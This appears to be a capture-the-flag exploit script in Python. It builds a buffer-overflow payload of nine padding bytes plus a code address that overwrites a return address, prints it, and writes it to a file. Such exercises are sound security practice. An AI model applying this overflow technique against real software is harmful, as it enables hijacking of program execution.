import os

padding = 'A'*9
func = '\x00\x40\x08\xc0'
file = 'flag.txt'

print(padding + func)
f = open('./problemXploit.txt', 'w')
f.write(padding + func)
f.close()
